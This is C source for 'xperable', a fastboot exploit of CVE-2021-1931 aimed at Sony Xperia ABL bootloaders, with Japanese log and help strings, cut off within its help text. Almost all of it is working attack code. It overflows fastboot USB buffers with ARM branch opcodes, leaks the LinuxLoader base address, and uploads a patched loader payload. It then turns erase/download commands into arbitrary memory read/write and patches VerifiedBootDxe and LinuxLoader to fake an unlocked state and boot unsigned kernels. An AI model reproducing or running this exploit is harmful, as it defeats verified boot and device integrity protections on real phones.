// SPDX-License-Identifier: GPL-3.0-or-later
/*
 * xperable.c - Xperia ABL fastboot Exploit of CVE-2021-1931
 *
 * Copyright (C) 2025 j4nn at xdaforums
 */

#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <string.h>
#include <stdint.h>
#include <inttypes.h>
#include <ctype.h>

#ifdef __MINGW64__
static void *memmem(const void *haystack, size_t haystacklen,
                    const void *needle, size_t needlelen)
{
    while (haystacklen >= needlelen) {
        if (memcmp(haystack, needle, needlelen) == 0)
            return (void *)haystack;
        haystack++; haystacklen--;
    }
    return NULL;
}
#endif

#include "fbusb.h"

#include "logging.h"
int verbosity = LOG_NFO;
static int abl_patch_ext;
static int override_flag;
static char cmdline[0x800];
static char cmdlinex[0x800];

#define OPCODE(ptr, a, b, c, d) \
    do { \
        unsigned char *p = (void *)(ptr); \
        p[0] = (a); p[1] = (b); p[2] = (c); p[3] = (d); \
    } while (0)

typedef void (*testx_patch_t)(unsigned char *buff, int size, int offset);

struct xperable_target {
    const char *ablver;
    const char *ytname;
    const char *llname;
    int offset;
    int size;
    testx_patch_t setup_test2;
    testx_patch_t setup_test3;
    int64_t test3_hitadj;
    int stage1_cont;
    void (*patch_abl)(unsigned char *ablcode, int extended);
    void (*setup_test4)(unsigned char *buff, int size, int offset,
                        int payloadsize);
    void (*setup_test5)(unsigned char *buff, int size, int offset,
                        int payloadsize);
    const char *test4_cmd;
    int vb_size;
    testx_patch_t test6_patch;
    testx_patch_t test7_patch;
    testx_patch_t test8_patch;
    testx_patch_t test9_patch;
};

#define XPERABLE_TARGET(idstr, blv) \
    { \
        .ablver = idstr, \
        .ytname = #blv, \
        .llname = "LinuxLoader-" #blv ".pe", \
        .offset = blv ## _offset, \
        .size = blv ## _size, \
        .setup_test2 = blv ## _setup_test2, \
        .setup_test3 = blv ## _setup_test3, \
        .test3_hitadj = blv ## _test3_hitadj, \
        .stage1_cont = blv ## _stage1_cont, \
        .patch_abl = blv ## _patch_abl, \
        .setup_test4 = blv ## _setup_test4, \
        .setup_test5 = blv ## _setup_test5, \
        .test4_cmd = blv ## _test4_cmd, \
        .vb_size = blv ## _vb_size, \
        .test6_patch = blv ## _test6_patch, \
        .test7_patch = blv ## _test7_patch, \
        .test8_patch = blv ## _test8_patch, \
        .test9_patch = blv ## _test9_patch, \
    }


#ifdef TARGET_ABL_P114
#include "target-p114.c"
#endif
#ifdef TARGET_ABL_O77
#include "target-o77.c"
#endif
#ifdef TARGET_ABL_P118
#include "target-p118.c"
#endif
#ifdef TARGET_ABL_Q207
#include "target-q207.c"
#endif


static struct xperable_target yoshino_abl_targets[] = {
#ifdef TARGET_ABL_P114
    XPERABLE_TARGET("X_Boot_MSM8998_LA2.0_P_114", p114),
#endif
#ifdef TARGET_ABL_O77
    XPERABLE_TARGET("X_Boot_MSM8998_LA1.1_O_77", o77),
#endif
#ifdef TARGET_ABL_P118
    XPERABLE_TARGET("X_Boot_SDM845_LA2.0_P_118", p118),
#endif
#ifdef TARGET_ABL_Q207
    XPERABLE_TARGET("X_Boot_SDM845_LA2.0.1_Q_207", q207),
#endif
    { .ablver = NULL }
};

static struct xperable_target *target = &yoshino_abl_targets[0];

static int set_xperable_target(const char *blver)
{
    int i;

    for (i = 0; yoshino_abl_targets[i].ablver != NULL; i++)
        if (strstr(blver, yoshino_abl_targets[i].ablver) != NULL) {
            target = &yoshino_abl_targets[i];
            PDBG("%s xperableターゲットを使用 (offset = 0x%x, size = 0x%x)\n",
                 target->ytname, target->offset, target->size);
            return 0;
        }
    target = &yoshino_abl_targets[i];
    PERR("%s バージョンはサポートされていません!\n", blver);
    return -1;
}


int load_pe(const char *fname, void *buff, int maxsize, uint64_t base_va,
            int *code_boundary);


static unsigned char txbuff[1024 * 1024 * 64];
static unsigned char rxbuff[1024 * 1024 * 64];
static unsigned char buffer[1024 * 1024 * 64];
static unsigned char kibuff[1024 * 1024 * 128];


// 0x9FFF7000, 0x00008000, "Log Buffer", AddMem, SYS_MEM, SYS_MEM_CAP,  RtData, WRITE_BACK_XN
#define LOGBUF_ADDR 0x9FFF7000
#define LOGBUF_SIZE 0x00008000
static char logbuf[LOGBUF_SIZE + 1];
static int logbuf_pos;

struct module_info {
    char name[64];
    uint64_t addr;
};

#define MAX_MODULES_NUM 128
static struct module_info modules[MAX_MODULES_NUM + 1];
static int logbuf_parsed;

static int add_module_addr(const char *mname, uint64_t addr);

static int getvar_all(struct fbusb *dev)
{
    int res;
    res = fbusb_strcmd(dev, "getvar:all", rxbuff, 65);
    while (res == FASTBOOT_INFO) {
        res = 0;
        if (strncmp(rxbuff, "version-bootloader:", 19) == 0)
            res = 1;
        if (verbosity >= LOG_NFO &&
                ( res == 1 || strncmp(rxbuff, "unlocked:", 9) == 0
                  || strncmp(rxbuff, "version-baseband:", 17) == 0
                  || strncmp(rxbuff, "secure:", 7) == 0
                  || strncmp(rxbuff, "product:", 8) == 0 )
            || verbosity >= LOG_DBG)
        {
            POUT("%s\n", rxbuff);
        }
        if (res)
            set_xperable_target(rxbuff + 19);
        res = fbusb_strcmd_resp(dev, rxbuff, 65);
    }
    if (res != FASTBOOT_OKAY) {
        if (res > 0)
            PERR("getvar all 失敗: %s\n", rxbuff);
        else
            PERR("getvar all プロトコルエラー, res=%d\n", res);
    }
    return res;
}

static int getvar_single(struct fbusb *dev, const char *var)
{
    int res;
    snprintf(txbuff, sizeof(txbuff), "getvar:%s", var);
    res = fbusb_strcmd(dev, txbuff, rxbuff, 65);
    if (res == FASTBOOT_OKAY) {
        POUT("%s: %s\n", var, rxbuff);
        if (strcmp(var, "version-bootloader") == 0)
            set_xperable_target(rxbuff);
    }
    return res;
}

static int test0(struct fbusb *dev, int size, int offset, const char *cmd)
{
    int i;
    int res;

    for (i = offset - 0x04; i >= 0; i -= 0x04)
        OPCODE(txbuff + i, 0x00, 0x00, 0x40, 0x94);  // bl #0x1000000 = [ 00 00 40 94 ]
        //OPCODE(txbuff + i, 0x00, 0x00, 0x00, 0x14);  // b  #0x00 = [ 00 00 00 14 ]
    for (i = offset; i < size; i += 0x04)
        //OPCODE(txbuff + i, 0x00, 0x00, 0xc0, 0x94);  // bl #0x3000000 = [ 00 00 c0 94 ]
        OPCODE(txbuff + i, 0x00, 0x00, 0x00, 0x14);  // b  #0x00 = [ 00 00 00 14 ]
    if (cmd != NULL)
        strcpy(txbuff, cmd);
    else
        snprintf(txbuff, 64, "download:%08x", 16);

    PNFO("test0 開始 size = 0x%08x, offset = 0x%08x, cmd = '%s'\n",
           size, offset, txbuff);
    PNFO_CONT("  %08x-%08x: [ %02x %02x %02x %02x ]\n", 0, offset - 4,
              txbuff[offset - 4 + 0], txbuff[offset - 4 + 1],
              txbuff[offset - 4 + 2], txbuff[offset - 4 + 3]);
    PNFO_CONT("  %08x-%08x: [ %02x %02x %02x %02x ]\n", offset, size - 4,
              txbuff[offset + 0], txbuff[offset + 1],
              txbuff[offset + 2], txbuff[offset + 3]);

    i = 64;
    res = fbusb_bufcmd(dev, txbuff, size, rxbuff, &i);
    if (res < 0) {
        i = 64;
        res = fbusb_bufcmd(dev, txbuff, strlen(txbuff), rxbuff, &i);
    }
    if (res == FASTBOOT_DATA) {
        size = 0;
        if (sscanf(txbuff, "download:%8x", &size) != 1)
            sscanf(rxbuff, "%8x", &size);
        memset(txbuff, 'A', size);
        i = 64;
        res = fbusb_bufcmd(dev, txbuff, size, rxbuff, &i);
    }

    PDBG("test0 完了: res = %d\n", res);
    return res < 0 ? 0 : -1;
}

static int test1(struct fbusb *dev, int size, int offset, const char *cmd)
{
    int i;
    int res;

    if (cmd != NULL && cmd[0] != '\0')
        strcpy(txbuff, cmd);
    else
        snprintf(txbuff, 64, "download:%08x", size);

    PNFO("test1 開始 size = 0x%08x, offset = 0x%08x, cmd = '%s'\n",
           size, offset, txbuff);

    res = fbusb_strcmd(dev, txbuff, rxbuff, 65);
    if (res < 0)
        res = fbusb_strcmd(dev, txbuff, rxbuff, 65);
    if (res == FASTBOOT_DATA) {
        size = 0;
        sscanf(rxbuff, "%8x", &size);
        i = 64;
        res = fbusb_bufcmd(dev, buffer, size, rxbuff, &i);
    }
    do {
        switch (res) {
        case FASTBOOT_OKAY:
        case FASTBOOT_FAIL:
        case FASTBOOT_INFO:
            if (rxbuff[0] != '\0')
                POUT("%s\n", rxbuff);
            break;
        }
        if (res == FASTBOOT_INFO)
            res = fbusb_strcmd_resp(dev, rxbuff, 65);
    } while (res == FASTBOOT_INFO);

    PDBG("test1 完了: res = %d\n", res);
    return res;
}

static int test2(struct fbusb *dev, int size, int offset, const char *cmd)
{
    int i;
    int res;
    char *p;

    if (target->ablver == NULL) {
        PERR("test2 失敗: ターゲットが設定されていません\n");
        return -1;
    }

    target->setup_test2(txbuff, size, offset);

    if (cmd != NULL)
        strcpy(txbuff, cmd);
    else
        snprintf(txbuff, 64, "download:%08x", 16);

    PNFO("test2 開始 size = 0x%06x, offset = 0x%02x, cmd = '%s'\n",
         size, offset, txbuff);

    i = 64;
    res = fbusb_bufcmd(dev, txbuff, size, rxbuff, &i);
    if (res < 0) {
        i = 64;
        res = fbusb_bufcmd(dev, txbuff, strlen(txbuff), rxbuff, &i);
    }
    switch (res) {
    case FASTBOOT_DATA:
        size = 0;
        if (sscanf(txbuff, "download:%8x", &size) != 1)
            sscanf(rxbuff, "%8x", &size);
        memset(txbuff, 'A', size);
        i = 64;
        res = fbusb_bufcmd(dev, txbuff, size, rxbuff, &i);
        PNFO("test2 未ヒット: レスポンス = '%s'\n", rxbuff);
        return -1;
    case FASTBOOT_UNKNOWN:
        if (i <= 11 + 11)
            rxbuff[i] = '\0';
        res = strtoul(rxbuff, &p, 16);
        if (p > (char *)rxbuff) {
            if (p[0] == '-') {
                char ds[16];
                snprintf(ds, sizeof(ds), "vxyz%06x-", res);
                for (i = 0; i < 8; i++)
                    if (strncmp(ds + i, p + 1, 11) == 0)
                        break;
                if (i < 8) {
                    PNFO("test2 成功: distance = 0x%06x + 0x%02x "
                         "(offset was 0x%02x)\n", res, (i << 4), offset);
                    return 0;
                }
            }
        }
        break;
    }
    PERR("test2 失敗: レスポンス = '%s'\n", rxbuff);
    return -1;
}

static int test3(struct fbusb *dev, int size, int offset, const char *cmd)
{
    int i;
    int res;
    char *p;

    if (target->ablver == NULL) {
        PERR("test3 失敗: ターゲットが設定されていません\n");
        return -1;
    }

    target->setup_test3(txbuff, size, offset);

    if (cmd != NULL)
        strcpy(txbuff, cmd);
    else
        snprintf(txbuff, 64, "download:%08x", 16);

    PNFO("test3 開始 size = 0x%06x, offset = 0x%02x, cmd = '%s'\n",
         size, offset, txbuff);

    i = 64;
    res = fbusb_bufcmd(dev, txbuff, size, rxbuff, &i);
    if (res < 0) {
        i = 64;
        res = fbusb_bufcmd(dev, txbuff, strlen(txbuff), rxbuff, &i);
    }
    switch (res) {
    case FASTBOOT_DATA:
        size = 0;
        if (sscanf(txbuff, "download:%8x", &size) != 1)
            sscanf(rxbuff, "%8x", &size);
        memset(txbuff, 'A', size);
        i = 64;
        res = fbusb_bufcmd(dev, txbuff, size, rxbuff, &i);
        PNFO("test3 未ヒット: レスポンス = '%s'\n", rxbuff);
        return -1;
    case FASTBOOT_FAIL:
        res = strtoul(rxbuff, &p, 16);
        if (p > (char *)rxbuff) {
            if (p[0] == ':') {
                uint64_t addr = *(uint64_t *)(p + 1);
                uint64_t base = *(uint64_t *)(p + 1 + 8);
                addr += target->test3_hitadj;
                base -= 0x97ffecddLL + 0x322D8LL;
                p[0] = '\0';
                PNFO("test3 成功: distance = 0x%06x, hit from 0x%06x, base = 0x%06x "
                     "(offset=0x%02x size=0x%02x)\n", res, (int)addr, (int)base,
                     offset, size);
                return 0;
            }
        }
        break;
    }
    PERR("test3 失敗: レスポンス = '%s'\n", rxbuff);
    return -1;
}


static int test4(struct fbusb *dev, int size, int offset, const char *fname)
{
    int i;
    int res;
    int payloadsize;
    unsigned addr;

    if (target->ablver == NULL) {
        PERR("test4 失敗: ターゲットが設定されていません\n");
        return -1;
    }

    payloadsize = 0;
    res = load_pe(fname, txbuff, sizeof(txbuff), 0, &payloadsize);
    if (res <= 0 || payloadsize == 0)
        return -1;

    target->setup_test4(txbuff, size, offset, payloadsize);

    PNFO("test4 開始 size = 0x%06x, offset = 0x%02x, "
         "payloadsize = 0x%02x\n", size, offset, payloadsize);

    // use +16 to differentiate between success and failure,
    // patch code will use 'payloadsize' regardless this
    // as it doest not parse that value
    snprintf(txbuff, 64, "download:%08x", (payloadsize + 16));

    i = 64;
    res = fbusb_bufcmd(dev, txbuff, size, rxbuff, &i);
    if (res < 0) {
        i = 64;
        res = fbusb_bufcmd(dev, txbuff, strlen(txbuff), rxbuff, &i);
    }
    if (res != FASTBOOT_DATA)
        return -1;
    size = 0;
    addr = 0;
    if (rxbuff[0] == 0x11) {
        addr = *(uint32_t *)&rxbuff[0] - 0x11111111;
        PNFO("LinuxLoader ベースアドレス取得 0x%08x (0x%08x)\n",
               addr, addr + 0x11111111);
        add_module_addr("LinuxLoader", addr);
    } else if (sscanf(rxbuff, "%8x", &size) == 1) {
        if (size == payloadsize + 16) {
            // no luck with the exploit, just follow protocol: upload the data
            memset(txbuff, 'A', size);
            i = 64;
            res = fbusb_bufcmd(dev, txbuff, size, rxbuff, &i);
            return -1;
        }
    }

    res = load_pe(fname, txbuff, sizeof(txbuff), addr, NULL);
    if (res <= 0)
        return -1;

    target->patch_abl(txbuff, abl_patch_ext);

    i = 64;
    res = fbusb_bufcmd(dev, txbuff, payloadsize, rxbuff, &i);
    if (res != FASTBOOT_OKAY) {
        PERR("LinuxLoader ペイロード送信失敗\n");
        return -1;
    }

    strcpy(txbuff, target->test4_cmd);

    res = fbusb_strcmd(dev, txbuff, rxbuff, 65);
    if (res == FASTBOOT_FAIL) {
        addr = 0;
        offset = 0;
        if (sscanf(rxbuff, "%x/%x", &addr, &offset) == 2) {
            PNFO("LinuxLoader @ 0x%08x パッチ適用成功 "
                 "(USB バッファ @ 0x%08x, distance = 0x%08x)\n",
                 addr, offset, addr - (unsigned)offset);
            return 0;
        }
    }
    PERR("LinuxLoader パッチ適用失敗: %s\n", rxbuff);
    return -1;
}

static int test5(struct fbusb *dev, int size, int offset, const char *fname)
{
    int i;
    int res;
    int payloadsize;
    unsigned addr;

    if (target->ablver == NULL) {
        PERR("test5 失敗: ターゲットが設定されていません\n");
        return -1;
    }

    payloadsize = 0;
    res = load_pe(fname, txbuff, sizeof(txbuff), 0, &payloadsize);
    if (res <= 0 || payloadsize == 0)
        return -1;

    target->setup_test5(txbuff, size, offset, payloadsize);

    PNFO("test5 開始 size = 0x%06x, offset = 0x%02x, "
         "payloadsize = 0x%02x\n", size, offset, payloadsize);

    // use +16 to differentiate between success and failure,
    // patch code will use 'payloadsize' regardless this
    // as it doest not parse that value
    snprintf(txbuff, 64, "download:%08x", (payloadsize + 16));

    i = 64;
    res = fbusb_bufcmd(dev, txbuff, size, rxbuff, &i);
    if (res < 0) {
        i = 64;
        res = fbusb_bufcmd(dev, txbuff, strlen(txbuff), rxbuff, &i);
    }
    if (res != FASTBOOT_DATA) {
        if (*(uint32_t *)rxbuff != 0)
            return -1;
        if (i > 4) {
            i -= 4;
            memmove(rxbuff, rxbuff + 4, i);
            memset(rxbuff + i, 0, 4);
        }
    }
    size = 0;
    addr = 0;
    if (rxbuff[0] == (target->stage1_cont & 0xff)) {
        addr = *(uint32_t *)&rxbuff[0] - target->stage1_cont;
        PNFO("LinuxLoader ベースアドレス取得 0x%08x (0x%08x)\n",
               addr, addr + target->stage1_cont);
        add_module_addr("LinuxLoader", addr);
    } else if (sscanf(rxbuff, "%8x", &size) == 1) {
        if (size == payloadsize + 16) {
            // no luck with the exploit, just follow protocol: upload the data
            memset(txbuff, 'A', size);
            i = 64;
            res = fbusb_bufcmd(dev, txbuff, size, rxbuff, &i);
            return -1;
        }
    }

    res = load_pe(fname, txbuff, sizeof(txbuff), addr, NULL);
    if (res <= 0)
        return -1;

    target->patch_abl(txbuff, abl_patch_ext);

    i = 64;
    res = fbusb_bufcmd(dev, txbuff, payloadsize, rxbuff, &i);
    if (res != FASTBOOT_OKAY) {
        PERR("LinuxLoader ペイロード送信失敗\n");
        return -1;
    }

    unsigned char *p = memmem(txbuff, payloadsize, "\xc0\x03\x5f\xd6", 4);
    uint64_t retoff = 0;
    if (p > txbuff)
        retoff = p - txbuff;

    strcpy(txbuff, target->test4_cmd);

    res = fbusb_strcmd(dev, txbuff, rxbuff, 65);
    if (res == FASTBOOT_FAIL) {
        addr = 0;
        offset = 0;
        if (sscanf(rxbuff, "%x/%x", &addr, &offset) == 2) {
            PNFO("LinuxLoader @ 0x%08x パッチ適用成功 "
                 "(USB バッファ @ 0x%08x, distance = 0x%08x)\n",
                 addr, offset, addr - (unsigned)offset);
#if 0
            retoff += addr;
            size = addr - offset;
            for (i = 0; i < size; i += 8) {
                *(uint64_t *)(txbuff + i) = retoff;
            }
            strcpy(txbuff, "dummycmd");

            i = 64;
            res = fbusb_bufcmd(dev, txbuff, size, rxbuff, &i);
            if (res < 0) {
                i = 64;
                res = fbusb_bufcmd(dev, txbuff, strlen(txbuff), rxbuff, &i);
            }

            PNFO("USB バッファ @ 0x%08x に 0x%016" PRIx64 " を充填, size = 0x%08x\n",
                 offset, retoff, size);
#endif
            return 0;
        }
    }
    PERR("LinuxLoader パッチ適用失敗: %s\n", rxbuff);
    return -1;
}

static int abl_set_addr(struct fbusb *dev, uint64_t addr, int rmode, uint64_t *prev)
{
    int res;
    uint64_t old;

    snprintf(txbuff, 64, "erase:0%c%09" PRIx64, rmode ? 'X' : 'x', addr);
    res = fbusb_strcmd(dev, txbuff, rxbuff, 65);
    if (res == FASTBOOT_FAIL && rxbuff[0] == '0' && rxbuff[1] == 'x') {
        old = strtoul(rxbuff, NULL, 16);
        PDBG("Target addr set to 0%c%08" PRIx64 " (prev 0x%08" PRIx64 ")\n",
             rmode ? 'X' : 'x', addr, old);
        if (prev != NULL)
            *prev = old;
        return 0;
    }
    return -1;
}

static int cmd_download(struct fbusb *dev, int size,
                      void *buffer, int rmode)
{
    int res;
    int rspsz;
    char *p;

    snprintf(txbuff, 64, "download:%08x", size);
    res = fbusb_strcmd(dev, txbuff, rxbuff, 65);
    if (res == FASTBOOT_DATA) {
        res = strtoul(rxbuff, &p, 16);
        if (res != size || (p - (char *)rxbuff) != 8) {
            PERR("cmd_download のダウンロードサイズが一致しません!\n");
            size = res;
        }
        rspsz = 64;
        if (rmode == 0)
            res = fbusb_bufcmd(dev, buffer, size, rxbuff, &rspsz);
        else
            res = fbusb_bufrcv(dev, buffer, size, rxbuff, &rspsz);
        if (res != FASTBOOT_OKAY) {
            if (res >= 0 && rspsz >= 0 && rspsz < 64) {
                rxbuff[rspsz] = '\0';
                PERR("cmd_download 失敗: %s!\n", rxbuff);
            }
        }
    }

    return res;
}

static int abl_mem_rw(struct fbusb *dev, uint64_t addr, int size,
                      void *buffer, int rmode)
{
    int res;
    uint64_t prev = 0;

    if (abl_set_addr(dev, addr, rmode, &prev) < 0)
        return -1;

    res = cmd_download(dev, size, buffer, rmode);

    abl_set_addr(dev, prev, 0, NULL);

    return res;
}

static int abl_mem_write(struct fbusb *dev, uint64_t addr, int size,
                         void *buffer)
{
    return abl_mem_rw(dev, addr, size, buffer, 0);
}

static int abl_mem_read(struct fbusb *dev, uint64_t addr, int size,
                        void *buffer)
{
    return abl_mem_rw(dev, addr, size, buffer, 1);
}

static int file_rd_buff(const char *fname, void *buffer, int size)
{
    int res;
    FILE *f = fopen(fname, "rb");
    if (f == NULL) {
        PRNO("file_rd_buff fopen %s", fname);
        return -1;
    }
    res = fread(buffer, 1, size, f);
    fclose(f);
    return res;
}

static int file_wr_buff(const char *fname, const void *buffer, int size)
{
    int res;
    FILE *f = fopen(fname, "wb");
    if (f == NULL) {
        PRNO("file_wr_buff fopen %s", fname);
        return -1;
    }
    res = fwrite(buffer, 1, size, f);
    fclose(f);
    return res == size ? 0 : -1;
}

static int patch_buff(void *buffer, int size, char *patch)
{
    int res;
    char *p;
    uint64_t val;
    unsigned offs;
    unsigned step;
    int state;
    uint8_t *buff = buffer;

    res = -1;
    step = 0;
    state = 0;
    p = patch;
    do {
        patch = p;
        val = strtoul(patch, &p, 16);
        if (p > patch) {
            switch (*p) {
            case ':': step = 1; state = 1; offs = val; p++; continue;
            case '/': step = 4; state = 1; offs = val; p++; continue;
            case '%': step = 4; state = 2; offs = val; p++; continue;
            case '@': step = 8; state = 1; offs = val; p++; continue;
            }
            if (step == 0)
                break;
            if (state == 1) {
                if (*p == ',')
                    p++;
                if (offs + step > size)
                    break;
                switch (step) {
                case 1:
                    *(uint8_t *)(buff + offs) = (uint8_t)val; res = 0; break;
                case 4:
                    *(uint32_t *)(buff + offs) = (uint32_t)val; res = 0; break;
                case 8:
                    *(uint64_t *)(buff + offs) = val; res = 0; break;
                }
                offs += step;
            } else if (state == 2) {
                if (*p == ',')
                    p++;
                if (offs + step > size)
                    break;
                if (step != 4)
                    break;
                *(uint32_t *)(buff + offs) = __builtin_bswap32(val);
                res = 0;
                offs += step;
            }
        }
    } while (p > patch);

    return res;
}

static int abl_read_logbuf(struct fbusb *dev)
{
    int i;
    int res;
    uint64_t val;
    char *ptr, *p;

    res = abl_mem_read(dev, LOGBUF_ADDR, LOGBUF_SIZE, logbuf);
    if (res != 0)
        return -1;
    if (logbuf_parsed)
        return 0;
    logbuf_parsed = 1;

    for (i = 0; modules[i].name[0] != '\0'; i++)
        ;
    ptr = logbuf;
    while ((p = strstr(ptr, " - 0x")) != NULL) {
        ptr = p + 5;
        val = strtoul(ptr, &p, 16);
        if (p > ptr) {
            if (p[0] == ' ' && p[1] == '[') {
                p += 2;
                while (*p == ' ' || isdigit(*p))
                    p++;
                if (p[0] == ']' && p[1] == ' ') {
                    p += 2;
                    ptr = p;
                    while (*p != '\r' && *p != '\n' && *p != '\0') {
                        if (strncmp(p, ".efi\r\n", 6) == 0) {
                            res = p - ptr;
                            if (res >= sizeof(modules[i].name))
                                res = sizeof(modules[i].name) - 1;
                            memcpy(modules[i].name, ptr, res);
                            modules[i].name[res] = '\0';
                            modules[i].addr = val;
                            p += 6;
                            ptr = p;
                            i++;
                            break;
                        }
                        p++;
                    }
                }
            }
        }
        if (i >= MAX_MODULES_NUM)
            break;
    }

    return 0;
}

static int abl_print_logbuf(struct fbusb *dev)
{
    int res;

    res = abl_read_logbuf(dev);
    if (res != 0)
        return -1;

    res = strlen(logbuf + logbuf_pos);
    if (res > 0) {
        PNFO("ログバッファ出力, logbuf_pos = 0x%04x, length = 0x%04x:\n",
             logbuf_pos, res);
        POUT("%s", logbuf + logbuf_pos);
        logbuf_pos += res;
    }

    return 0;
}

static int get_module_addr(struct fbusb *dev, const char *mname, uint64_t *addr)
{
    int i;
    int res;

    *addr = 0;
    for (i = 0; modules[i].name[0] != '\0'; i++) {
        if (strcmp(modules[i].name, mname) == 0) {
            *addr = modules[i].addr;
            return 0;
        }
    }
    if (!logbuf_parsed) {
        res = abl_read_logbuf(dev);
        if (res != 0)
            return -1;
        for (i = 0; modules[i].name[0] != '\0'; i++) {
            if (strcmp(modules[i].name, mname) == 0) {
                *addr = modules[i].addr;
                return 0;
            }
        }
    }

    return -1;
}

static int add_module_addr(const char *mname, uint64_t addr)
{
    int i;
    int res;

    for (i = 0; modules[i].name[0] != '\0'; i++) {
        if (strcmp(modules[i].name, mname) == 0) {
            modules[i].addr = addr;
            return 0;
        }
    }
    if (i >= MAX_MODULES_NUM)
        return -1;
    strncpy(modules[i].name, mname, sizeof(modules[i].name) - 1);
    modules[i].name[sizeof(modules[i].name) - 1] = '\0';
    modules[i].addr = addr;
    return 0;
}

static int abl_list_modules(struct fbusb *dev)
{
    int i;
    int res;

    if (!logbuf_parsed) {
        res = abl_read_logbuf(dev);
        if (res != 0)
            return -1;
    }
    POUT("UEFIモジュール一覧:\n");
    for (i = 0; modules[i].name[0] != '\0'; i++)
        POUT("  0x%09" PRIx64 " %s\n", modules[i].addr, modules[i].name);

    return 0;
}

static int test6(struct fbusb *dev, int size, int offset)
{
    int res;
    uint64_t addr = 0;

    if (target->ablver == NULL) {
        PERR("test6 失敗: ターゲットが設定されていません\n");
        return -1;
    }

    PNFO("test6 開始\n");

    res = get_module_addr(dev, "VerifiedBootDxe", &addr);
    if (res < 0)
        goto test6_failed;

    res = abl_mem_read(dev, addr, target->vb_size, buffer);
    if (res < 0)
        goto test6_failed;

    target->test6_patch(buffer, size, offset);

    res = abl_mem_write(dev, addr, target->vb_size, buffer);
    if (res < 0)
        goto test6_failed;

    PNFO("VerifiedBootDxe @ 0x%08" PRIx64 " パッチ適用成功\n", addr);
    return 0;

  test6_failed:
    PERR("VerifiedBootDxe パッチ適用失敗\n");
    return -1;
}

static int test7(struct fbusb *dev, int size, int offset)
{
    int res;
    int cbd;
    uint64_t addr;

    if (target->ablver == NULL) {
        PERR("test7 失敗: ターゲットが設定されていません\n");
        return -1;
    }

    PNFO("test7 開始\n");

    res = get_module_addr(dev, "LinuxLoader", &addr);
    if (res < 0)
        goto test7_failed;

    res = load_pe(target->llname, buffer, sizeof(buffer), addr, &cbd);
    if (res <= 0 || cbd <= 0)
        goto test7_failed;

    res = abl_mem_read(dev, addr, cbd, buffer);
    if (res < 0)
        goto test7_failed;

    target->test7_patch(buffer, size, offset);

    res = abl_mem_write(dev, addr, cbd, buffer);
    if (res < 0)
        goto test7_failed;

    PNFO("LinuxLoader @ 0x%08" PRIx64 " 偽アンロックにパッチ適用\n", addr);
    return 0;

  test7_failed:
    PERR("LinuxLoader @ 0x%08" PRIx64 " パッチ適用失敗\n", addr);
    return -1;
}


static int test8(struct fbusb *dev, int size, int offset, const char *arg)
{
    int res;
    int cbd;
    uint64_t addr;

    if (target->ablver == NULL) {
        PERR("test8 失敗: ターゲットが設定されていません\n");
        return -1;
    }

    if (size < 0 || size >= sizeof(kibuff)) {
        PERR("test8 には2つのカーネルイメージが必要です\n");
        return -1;
    }
    memcpy(kibuff, buffer, size);

    PNFO("test8 開始\n");

    res = file_rd_buff(arg, kibuff + size + 8, sizeof(kibuff) - size - 16);
    if (res < 0)
        return -1;

    *(uint64_t *)(kibuff + size) = res;
    *(uint64_t *)(kibuff + size + 8 + res) = size;
    size += 8 + res + 8;

    res = get_module_addr(dev, "LinuxLoader", &addr);
    if (res < 0)
        goto test8_failed;

    res = load_pe(target->llname, buffer, sizeof(buffer), addr, &cbd);
    if (res <= 0 || cbd <= 0)
        goto test8_failed;

#if 0
//    res = abl_mem_read(dev, addr, cbd, buffer);
//    if (res < 0)
//        goto test8_failed;
    target->patch_abl(buffer, abl_patch_ext);

    target->test8_patch(buffer, cbd, offset);

    res = abl_mem_write(dev, addr, cbd, buffer);
    if (res < 0)
        goto test8_failed;

    PNFO("LinuxLoader @ 0x%08" PRIx64 " test8 用にパッチ適用\n", addr);
#else
    if (abl_patch_ext > 2)
        PNFO("LinuxLoader @ 0x%08" PRIx64 " test8 用パッチ適用済み\n", addr);
    else
        PNFO("LinuxLoader @ 0x%08" PRIx64 " test8 用パッチ未適用!\n", addr);
#endif

    fbusb_set_timeout(dev, 30 * 1000);

    res = cmd_download(dev, size, kibuff, 0);
    if (res != FASTBOOT_OKAY) {
        PERR("test8 カーネルイメージのアップロード失敗\n");
        return -1;
    }

    res = fbusb_strcmd(dev, "boot", rxbuff, 65);
    if (res != FASTBOOT_OKAY) {
        PERR("test8 ブートコマンド失敗\n");
        return -1;
    }

    PNFO("test8 成功\n", addr);
    return 0;

  test8_failed:
    PERR("test8 失敗\n");
    return -1;
}

static int test9(struct fbusb *dev, int size, int offset)
{
    int res;
    uint64_t addr = 0;

    if (target->ablver == NULL) {
        PERR("test9 失敗: ターゲットが設定されていません\n");
        return -1;
    }

    PNFO("test9 開始\n");

    res = get_module_addr(dev, "VerifiedBootDxe", &addr);
    if (res < 0)
        goto test9_failed;

    res = abl_mem_read(dev, addr, target->vb_size, buffer);
    if (res < 0)
        goto test9_failed;

    target->test9_patch(buffer, size, offset);

    res = abl_mem_write(dev, addr, target->vb_size, buffer);
    if (res < 0)
        goto test9_failed;

    PNFO("VerifiedBootDxe @ 0x%08" PRIx64 " test9 でパッチ適用\n", addr);
    return 0;

  test9_failed:
    PERR("VerifiedBootDxe パッチ適用失敗\n");
    return -1;
}


static void show_help(void)
{
    puts("");
    puts("xperable - Xperia ABL fastboot エクスプロイト");
    puts("(  https://github.com/j4nn/xperable  )");
    puts("");
    puts("使用法: ./xperable [-h] [-v] [-q] [-V] [-Q] [-A] [-B] [-U]");
    puts("                  [-b maxsize] [-t timeout] [-o offset] [-s size]");
    puts("                  [-c command] [-x] [-0] [-1] [-2] [-3] [-4]");
    puts("                  [-5] [-6] [-7] [-8] [-9] [-C cmdline]");
    puts("                  [-l] [-m] [-a addr] [-M module]");
    puts("                  [-r] [-O file] [-I file] [-w]");
    puts("                  [-P file] [-p patch]");
    puts("");
    puts("  -h            このヘルプを表示して終了");
    puts("  -v            fastboot USB通信の詳細出力を増やす");
    puts("  -q            fastboot USB通信の詳細出力を減らす");
    puts("  -V            エクスプロイト自体の詳細出力を増やす");
    puts("  -Q            エクスプロイトの詳細出力を減らす");
    puts("  -A            フィルタ出力で 'fastboot getvar all' を実行");
    puts("  -B            'fastboot getvar version-bootloader' コマンドを実行");
    puts("  -U            'fastboot getvar unknown' コマンドを実行");
    puts("  -b maxsize    全転送で使用するUSBチャンク最大サイズを設定");
    puts("  -t timeout    USB転送タイムアウトをミリ秒で設定（デフォルト: 5000）");
    puts("  -o offset     エクスプロイトテストケースで使用するオフセットを設定");
